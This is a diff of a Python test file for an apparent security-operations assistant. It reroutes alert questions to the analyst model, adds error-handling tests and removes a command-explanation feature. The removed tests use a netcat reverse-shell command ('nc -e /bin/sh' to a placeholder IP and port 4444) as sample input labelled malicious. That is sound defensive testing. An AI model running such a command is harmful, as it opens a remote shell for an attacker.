@@ -13,7 +13,6 @@ from app.services.wazuh.models import (
     IOCHuntResult,
     RawAlertDocument,
 )
-from app.soc_assistant.command_explainer import CommandExplanation
 from app.soc_assistant.router import AssistantIntentRouter
 from app.soc_assistant.schemas import AssistantCommandName, AssistantIntent
 from app.soc_assistant.service import SOCAssistant
@@ -67,7 +66,9 @@ class ArgumentAliasLLM:
 
 class UnavailableToolAgent:
     def answer(self, **kwargs):
-        raise RuntimeError("tool agent offline in tests")
+        from app.mape_k.llm import LLMConfigurationError
+
+        raise LLMConfigurationError("tool agent offline in tests")
 
 
 class FakeQuestionAgent:
@@ -192,6 +193,9 @@ class FakeInvestigations:
     def active_for_alert(self, alert_id, *, organization_id):
         return None
 
+    def completed_analysis_count(self, **_kwargs):
+        return 0
+
 
 def test_slash_commands_are_strict_and_typed():
     router = AssistantIntentRouter(llm=FailingLLM())
@@ -213,8 +217,6 @@ def test_slash_commands_are_strict_and_typed():
     question = router.parse_slash("/ask how should I contain this alert?")
     assert question.command == AssistantCommandName.CHAT
     assert question.arguments["question"] == "how should I contain this alert?"
-    explained = router.parse_slash("/explain nc -e /bin/sh 192.0.2.10 4444")
-    assert explained.command == AssistantCommandName.EXPLAIN
     assert router.parse_slash("/plan INV-TEST").arguments == {
         "investigation_id": "INV-TEST"
     }
@@ -224,7 +226,6 @@ def test_slash_commands_are_strict_and_typed():
     assert router.parse_slash("/continue INV-TEST").command == (
         AssistantCommandName.CONTINUE
     )
-    assert explained.arguments["command"] == "nc -e /bin/sh 192.0.2.10 4444"
     with pytest.raises(ValueError, match="Unsupported option"):
         router.parse_slash("/alerts --write yes")
     with pytest.raises(ValueError, match="Unknown command"):
@@ -267,8 +268,8 @@ def test_general_what_happened_question_is_not_forced_to_status():
     ("message", "command"),
     [
         ("hello", AssistantCommandName.CHAT),
-        ("get only alerts", AssistantCommandName.ALERTS),
-        ("give me the latest alerts", AssistantCommandName.ALERTS),
+        ("get only alerts", AssistantCommandName.CHAT),
+        ("give me the latest alerts", AssistantCommandName.CHAT),
         ("threat hunt for 192.0.2.10", AssistantCommandName.HUNT),
         (
             "run the whole MAPE-K process for alert alert-1",
@@ -386,42 +387,29 @@ def test_unknown_oxy_arguments_fail_closed_to_chat():
 @pytest.mark.parametrize(
     ("message", "command", "arguments"),
     [
-        # A named window makes these "recent" questions, which is a different
-        # reference point from "new since my last check".
+        # A named window used to make these deterministic "recent" listing
+        # questions; they now reach the analyst model, which can apply the
+        # window/severity/agent filter itself via search_alerts/aggregate_alerts.
         (
             "what alerts came in overnight?",
-            AssistantCommandName.ALERTS,
-            {"hours": 12, "change_subject": "alerts", "change_mode": "recent"},
+            AssistantCommandName.CHAT,
+            {"question": "what alerts came in overnight?"},
         ),
         (
             "any critical alerts in the last hour?",
-            AssistantCommandName.ALERTS,
-            {
-                "hours": 1,
-                "severity": "critical",
-                "change_subject": "alerts",
-                "change_mode": "recent",
-            },
+            AssistantCommandName.CHAT,
+            {"question": "any critical alerts in the last hour?"},
         ),
         (
             "show me alerts from agent 004",
-            AssistantCommandName.ALERTS,
-            {
-                "agent_id": "004",
-                "change_subject": "alerts",
-                "change_mode": "recent",
-            },
+            AssistantCommandName.CHAT,
+            {"question": "show me alerts from agent 004"},
         ),
         ("are we connected?", AssistantCommandName.HEALTH, {}),
         (
             "isolate agent 004",
             AssistantCommandName.CHAT,
             {"question": "isolate agent 004"},
-        ),
-        (
-            "explain this command: nc -e /bin/sh 1.2.3.4 4444",
-            AssistantCommandName.EXPLAIN,
-            {"command": "nc -e /bin/sh 1.2.3.4 4444"},
         ),
     ],
 )
@@ -477,7 +465,7 @@ def test_vague_shortcut_does_not_swallow_targeted_or_formal_phrasing():
         AssistantCommandName.STATUS
     )
     assert router.route("show recent alerts")[0].command == (
-        AssistantCommandName.ALERTS
+        AssistantCommandName.CHAT
     )
 
 
@@ -568,7 +556,7 @@ def test_chat_has_no_second_ungrounded_model_fallback(monkeypatch):
     assert response.response["display_mode"] == "conversation"
     assert response.response["answer_type"] == "model_unavailable"
     assert response.tools_used == []
-    assert "analyst model is unavailable" in response.assistant_message
+    assert "analyst model is not configured" in response.assistant_message
     assert question_agent.calls == []
     assert gateway.calls == []
 
@@ -644,10 +632,6 @@ def test_live_tool_timeout_is_reported_as_timeout(monkeypatch):
 
 
 def test_question_agent_failure_does_not_break_commands(monkeypatch):
-    class FailingQuestionAgent:
-        def answer(self, **kwargs):
-            raise RuntimeError("provider unavailable")
-
     monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
     service = SOCAssistant(
         gateway=FakeGateway(),
@@ -693,7 +677,58 @@ def test_chat_rate_limit_skips_question_agent_fallback(monkeypatch):
     assert response.response["answer_type"] == "rate_limited"
     assert response.response["display_mode"] == "conversation"
     assert "rate limit" in response.assistant_message.lower()
+    assert response.response["grounding_status"] == "ungrounded"
+    assert response.response["retrieved_evidence_references"] == []
+    assert response.response["analyst_metrics"]["evidence_retrieved"] == 0
+    assert response.response["analyst_metrics"]["investigation_status"] == "incomplete"
     assert question_agent.calls == []
+
+
+def test_provider_outage_before_retrieval_reports_no_evidence(monkeypatch):
+    from app.mape_k.llm import LLMErrorCode, LLMInvocationError
+
+    class ProviderOutageAgent:
+        def answer(self, **_kwargs):
+            raise LLMInvocationError(
+                LLMErrorCode.MODEL_PROVIDER_UNAVAILABLE,
+                retryable=True,
+                attempt=1,
+                duration_ms=19,
+            )
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=FakeInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        tool_agent=ProviderOutageAgent(),
+    )
+
+    response = respond(service, "what happened on servervb?")
+
+    metrics = response.response["analyst_metrics"]
+    assert response.response["answer_type"] == "model_unavailable"
+    assert metrics["interruption_category"] == "model_provider_outage"
+    assert metrics["evidence_retrieved"] == 0
+    assert metrics["event_details_examined"] == 0
+    assert response.response["retrieved_evidence_references"] == []
+
+
+def test_unexpected_chat_application_error_is_not_mislabeled_or_suppressed(monkeypatch):
+    class BrokenAgent:
+        def answer(self, **_kwargs):
+            raise RuntimeError("programming bug")
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=FakeInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        tool_agent=BrokenAgent(),
+    )
+
+    with pytest.raises(RuntimeError, match="programming bug"):
+        respond(service, "what happened on servervb?")
 
 
 def test_triage_groups_alerts_and_returns_evidence_backed_verdicts(monkeypatch):
@@ -909,7 +944,7 @@ def test_durable_alerts_query_postgresql_memory_not_live_wazuh(monkeypatch):
     )
 
     class FindingRepository:
-        def list(self, **kwargs):
+        def _records(self):
             return [
                 {
                     "finding_id": "FND-PERSISTED",
@@ -933,6 +968,30 @@ def test_durable_alerts_query_postgresql_memory_not_live_wazuh(monkeypatch):
                     },
                 }
             ]
+
+        def list(self, *, limit, offset=0, created_after=None,
+                 updated_after=None, created_on_or_before=None,
+                 changed_after=None, **kwargs):
+            records = self._records()
+            if created_after:
+                records = [item for item in records if item["created_at"] > created_after]
+            if updated_after:
+                records = [item for item in records if item["updated_at"] > updated_after]
+            if created_on_or_before:
+                records = [
+                    item for item in records
+                    if item["created_at"] <= created_on_or_before
+                ]
+            if changed_after:
+                records = [
+                    item for item in records
+                    if item["created_at"] > changed_after
+                    or item["updated_at"] > changed_after
+                ]
+            return records[offset : offset + limit]
+
+        def count(self, **kwargs):
+            return len(self.list(limit=1000, **kwargs))
 
     monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
     monkeypatch.setattr(
@@ -1009,46 +1068,12 @@ def test_help_and_health_are_available_without_llm(monkeypatch):
     service, _, _ = assistant()
 
     help_response = respond(service, "/help")
-    assert len(help_response.response["commands"]) == 13
+    assert len(help_response.response["commands"]) == 12
     assert help_response.tools_used == []
 
     health = respond(service, "/health")
     assert health.response["status"] == "healthy"
     assert health.tools_used == ["indexer_health", "validate_server"]
-
-
-def test_explain_command_is_available_from_chat_and_slash(monkeypatch):
-    def fake_explain(command):
-        assert command == "nc -e /bin/sh 1.2.3.4 4444"
-        return (
-            CommandExplanation(
-                plain_english="Netcat launches a shell and connects it outward.",
-                behavior=["Starts a shell", "Connects to 1.2.3.4:4444"],
-                risk="malicious",
-                indicators=["-e", "/bin/sh"],
-                recommended_checks=["Review process and network telemetry."],
-            ),
-            {"input_tokens": 20, "output_tokens": 12},
-        )
-
-    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
-    monkeypatch.setattr(
-        "app.soc_assistant.service.explain_command",
-        fake_explain,
-    )
-    service, _, _ = assistant()
-
-    natural = respond(
-        service,
-        "explain this command: nc -e /bin/sh 1.2.3.4 4444",
-    )
-    slash = respond(service, "/explain nc -e /bin/sh 1.2.3.4 4444")
-
-    for response in (natural, slash):
-        assert response.selected_command == AssistantCommandName.EXPLAIN
-        assert response.response["risk"] == "malicious"
-        assert response.response["display_mode"] == "command_explanation"
-        assert response.tools_used == ["explain_command"]
 
 
 def test_wazuh_connection_failure_returns_assistant_message(monkeypatch):
@@ -1061,7 +1086,10 @@ def test_wazuh_connection_failure_returns_assistant_message(monkeypatch):
         tool_agent=UnavailableToolAgent(),
     )
 
-    result = respond(service, "give me the latest alerts")
+    # "give me the latest alerts" now reaches the analyst model instead of
+    # this deterministic path; "any new alerts?" still needs the cursor and
+    # exercises the same gateway-unreachable handling this test is for.
+    result = respond(service, "any new alerts?")
 
     assert result.selected_command == AssistantCommandName.ALERTS
     assert result.tools_used == ["search_alerts"]
@@ -1107,6 +1135,14 @@ def test_tool_agent_failure_is_machine_visible_in_chat_payload(monkeypatch):
                 answer="The alert search failed, so live scope is unverified.",
                 tool_calls=["search_alerts"],
                 failed_tools=["search_alerts"],
+                metrics={
+                    "tool_events": [
+                        {
+                            "tool": "search_alerts",
+                            "outcome": "source_failure",
+                        }
+                    ]
+                },
             )
 
     monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
@@ -1122,6 +1158,11 @@ def test_tool_agent_failure_is_machine_visible_in_chat_payload(monkeypatch):
     assert response.response["answer_type"] == "soc_analyst_partial"
     assert response.response["grounded"] is False
     assert response.response["failed_tools"] == ["search_alerts"]
+    failed_activity = next(
+        item for item in response.activities if item.tool == "search_alerts"
+    )
+    assert failed_activity.status == "failed"
+    assert failed_activity.label == "Source failed for search_alerts"
 
 
 def test_chat_answer_that_surfaces_an_alert_updates_active_alert_id(monkeypatch):
